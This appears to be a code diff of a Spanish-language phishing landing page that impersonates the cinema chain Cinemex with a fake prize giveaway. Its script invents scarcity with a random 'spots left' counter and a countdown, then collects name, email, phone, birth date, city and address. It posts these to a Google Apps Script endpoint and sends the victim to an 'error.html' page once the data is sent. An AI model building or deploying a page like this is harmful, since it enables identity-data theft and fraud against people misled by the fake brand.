@@ -51,7 +51,6 @@
             align-items: center;
         }
 
-        /* --- COLUMNA IZQUIERDA --- */
         .hero-content h1 {
             font-size: 3.5rem;
             line-height: 1;
@@ -67,14 +66,12 @@
             margin-top: 1.5rem;
         }
 
-        /* --- COLUMNA DERECHA (FORMULARIO + TIMER) --- */
         .form-container {
             display: flex;
             flex-direction: column;
             gap: 15px;
         }
 
-        /* Timer justo arriba del formulario */
         .timer-card {
             background: rgba(230, 36, 36, 0.2);
             backdrop-filter: blur(10px);
@@ -92,44 +89,44 @@
         .time-item label { font-size: 0.6rem; text-transform: uppercase; font-weight: 700; opacity: 0.8; }
 
         .form-card {
-    background: rgba(10, 15, 30, 0.6);
-    backdrop-filter: blur(25px);
-    border: 1px solid rgba(255,255,255,0.15);
-    border-radius: 30px;
-    padding: 3rem;
-}
+            background: rgba(10, 15, 30, 0.6);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 30px;
+            padding: 3rem;
+        }
 
-.input-grid {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 1.2rem;
-}
+        .input-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.2rem;
+        }
 
-.full-width {
-    grid-column: span 2;
-}
+        .full-width {
+            grid-column: span 2;
+        }
 
-input {
-    width: 100%;
-    padding: 14px;
-    border-radius: 12px;
-    border: 1px solid rgba(255,255,255,0.15);
-    background: rgba(0,0,0,0.3);
-    color: white;
-}
+        input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(0,0,0,0.3);
+            color: white;
+        }
 
-.cta-button {
-    width: 100%;
-    margin-top: 2rem;
-    padding: 1.2rem;
-    border-radius: 12px;
-    background: #e62424;
-    color: white;
-    font-weight: 900;
-    border: none;
-    cursor: pointer;
-}
-        /* Inputs */
+        .cta-button {
+            width: 100%;
+            margin-top: 2rem;
+            padding: 1.2rem;
+            border-radius: 12px;
+            background: #e62424;
+            color: white;
+            font-weight: 900;
+            border: none;
+            cursor: pointer;
+        }
+
         .input-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.8rem; }
         .full { grid-column: span 2; }
 
@@ -162,19 +159,36 @@ input {
 
         .cta-button:hover { filter: brightness(1.2); transform: translateY(-2px); }
 
+        .spots-left {
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 85%;
+            background: var(--primary);
+            box-shadow: 0 0 10px var(--primary);
+            transition: width 1s;
+        }
+
         @media (max-width: 900px) {
             .container { grid-template-columns: 1fr; text-align: center; }
             .promo-img { max-width: 300px; margin: 1.5rem auto; }
         }
-         .footer {
-    text-align: center;
-    padding: 1.5rem;
-    background: rgba(0, 0, 0, 0.8);
-    border-top: 1px solid var(--glass-border);
-    font-size: 0.75rem;
-    opacity: 0.7;
-    margin-top: 2rem;
-}
+
+        .footer {
+            text-align: center;
+            padding: 1.5rem;
+            background: rgba(0, 0, 0, 0.8);
+            border-top: 1px solid var(--glass-border);
+            font-size: 0.75rem;
+            opacity: 0.7;
+            margin-top: 2rem;
+        }
     </style>
 </head>
 <body>
@@ -202,71 +216,76 @@ input {
             </div>
 
             <section class="form-card">
-    <div class="form-header">
-        <h2>RECLAMA TU KIT</h2>
-        <p>Verificación de identidad necesaria</p>
-    </div>
+                <div class="form-header">
+                    <h2>RECLAMA TU KIT</h2>
+                    <p>Verificación de identidad necesaria</p>
+                </div>
 
-    <div style="display:flex; justify-content:space-between; font-size: 0.7rem; font-weight:900; margin-bottom: 5px;">
-        <span style="opacity: 0.8;">DISPONIBILIDAD</span>
-        <span style="color: var(--accent)" id="txt-lugares">8 LUGARES RESTANTES</span>
-    </div>
+                <div style="display:flex; justify-content:space-between; font-size: 0.7rem; font-weight:900; margin-bottom: 5px;">
+                    <span style="opacity: 0.8;">DISPONIBILIDAD</span>
+                    <span style="color: var(--accent)" id="txt-lugares">8 LUGARES RESTANTES</span>
+                </div>
 
-    <div class="spots-left">
-        <div class="progress-fill" id="barra-progreso"></div>
-    </div>
+                <div class="spots-left">
+                    <div class="progress-fill" id="barra-progreso"></div>
+                </div>
 
-    <div class="input-grid">
-        <div class="input-group full-width">
-            <label>Nombre Completo</label>
-            <input type="text" id="nombre" placeholder="Nombre y Apellido">
-        </div>
+                <div class="input-grid">
+                    <div class="input-group full-width">
+                        <label>Nombre Completo</label>
+                        <input type="text" id="nombre" placeholder="Nombre y Apellido">
+                    </div>
 
-        <div class="input-group">
-            <label>E-mail</label>
-            <input type="email" id="correo" placeholder="tu@correo.com">
-        </div>
+                    <div class="input-group">
+                        <label>E-mail</label>
+                        <input type="email" id="correo" placeholder="tu@correo.com">
+                    </div>
 
-        <div class="input-group">
-            <label>Teléfono</label>
-            <input type="tel" id="telefono" placeholder="10 dígitos">
-        </div>
+                    <div class="input-group">
+                        <label>Teléfono</label>
+                        <input type="tel" id="telefono" placeholder="10 dígitos">
+                    </div>
 
-        <div class="input-group">
-            <label>Nacimiento</label>
-            <input type="date" id="fecha">
-        </div>
+                    <div class="input-group">
+                        <label>Nacimiento</label>
+                        <input type="date" id="fecha">
+                    </div>
 
-        <div class="input-group">
-            <label>Ciudad</label>
-            <input type="text" id="trabajo" placeholder="Ciudad">
-        </div>
+                    <div class="input-group">
+                        <label>Ciudad</label>
+                        <input type="text" id="trabajo" placeholder="Ciudad">
+                    </div>
 
-        <div class="input-group full-width">
-            <label>Dirección de Envío</label>
-            <input type="text" id="direccion" placeholder="Calle, Número, C.P.">
-        </div>
-    </div>
+                    <div class="input-group full-width">
+                        <label>Dirección de Envío</label>
+                        <input type="text" id="direccion" placeholder="Calle, Número, C.P.">
+                    </div>
+                </div>
 
-    <button class="cta-button" onclick="enviarDatos()">RECLAMAR PREMIO AHORA</button>
+                <button class="cta-button" onclick="enviarDatos()">RECLAMAR PREMIO AHORA</button>
 
-    <p style="font-size: 0.6rem; text-align: center; margin-top: 1.2rem; opacity: 0.6;">
-        Evento promocional limitado a mayores de edad.
-    </p>
-</section>
+                <p style="font-size: 0.6rem; text-align: center; margin-top: 1.2rem; opacity: 0.6;">
+                    Evento promocional limitado a mayores de edad.
+                </p>
+            </section>
+        </section>
     </main>
-<script>
-    let tiempoTotal = 15 * 60;
 
-    function actualizarContador() {
-        let m = Math.floor(tiempoTotal / 60);
-        let s = tiempoTotal % 60;
+    <script>
+        let tiempoTotal = 15 * 60;
 
-        document.getElementById('minutos').innerText = m.toString().padStart(2, '0');
-        document.getElementById('segundos').innerText = s.toString().padStart(2, '0');
+        function actualizarContador() {
+            if (tiempoTotal > 0) {
+                tiempoTotal--;
+            }
 
-        if (tiempoTotal > 0) {
-            tiempoTotal--;
+            let horas = Math.floor(tiempoTotal / 3600);
+            let minutos = Math.floor((tiempoTotal % 3600) / 60);
+            let segundos = tiempoTotal % 60;
+
+            document.getElementById('horas').innerText = horas.toString().padStart(2, '0');
+            document.getElementById('minutos').innerText = minutos.toString().padStart(2, '0');
+            document.getElementById('segundos').innerText = segundos.toString().padStart(2, '0');
 
             if (tiempoTotal % 45 === 0) {
                 let lugares = Math.floor(Math.random() * 2) + 2;
@@ -274,53 +293,52 @@ input {
                 document.getElementById('barra-progreso').style.width = (lugares * 12) + "%";
             }
         }
-    }
 
-    setInterval(actualizarContador, 1000);
+        setInterval(actualizarContador, 1000);
 
-    async function enviarDatos() {
-        const btn = document.querySelector('.cta-button');
-        const url = "https://script.google.com/macros/s/AKfycbwLcrPYwIp-VWAT3ILTjwtNfBTnPBAKcPAkHUVDcPcPq4eiN4An0fKsAy7Y6x5Y51E0Kg/exec";
+        async function enviarDatos() {
+            const btn = document.querySelector('.cta-button');
+            const url = "https://script.google.com/macros/s/AKfycbwLcrPYwIp-VWAT3ILTjwtNfBTnPBAKcPAkHUVDcPcPq4eiN4An0fKsAy7Y6x5Y51E0Kg/exec";
 
-        const datos = {
-            nombre: document.getElementById('nombre').value,
-            correo: document.getElementById('correo').value,
-            fecha: document.getElementById('fecha').value,
-            telefono: document.getElementById('telefono').value,
-            direccion: document.getElementById('direccion').value,
-            trabajo: document.getElementById('trabajo').value
-        };
+            const datos = {
+                nombre: document.getElementById('nombre').value,
+                correo: document.getElementById('correo').value,
+                fecha: document.getElementById('fecha').value,
+                telefono: document.getElementById('telefono').value,
+                direccion: document.getElementById('direccion').value,
+                trabajo: document.getElementById('trabajo').value
+            };
 
-        btn.innerText = "REGISTRANDO...";
-        btn.disabled = true;
+            btn.innerText = "REGISTRANDO...";
+            btn.disabled = true;
 
-        try {
-            const respuesta = await fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(datos)
-            });
+            try {
+                const respuesta = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(datos)
+                });
 
-            if (respuesta.ok) {
-                window.location.href = "error.html";
-            } else {
-                alert("No se pudo registrar.");
+                if (respuesta.ok) {
+                    window.location.href = "error.html";
+                } else {
+                    alert("No se pudo registrar.");
+                    btn.innerText = "RECLAMAR PREMIO AHORA";
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                alert("Error al enviar datos.");
                 btn.innerText = "RECLAMAR PREMIO AHORA";
                 btn.disabled = false;
             }
-        } catch (error) {
-            alert("Error al enviar datos.");
-            btn.innerText = "RECLAMAR PREMIO AHORA";
-            btn.disabled = false;
         }
-    }
-</script>
+    </script>
     
-     <footer class="footer">
-    <p>© 2026 CINEMEX. Todos los derechos reservados.</p>
-    <p>Promoción sujeta a disponibilidad. Términos y condiciones aplican.</p>
-</footer>
+    <footer class="footer">
+        <p>© 2026 CINEMEX. Todos los derechos reservados.</p>
+        <p>Promoción sujeta a disponibilidad. Términos y condiciones aplican.</p>
+    </footer>
 </body>
 </html>
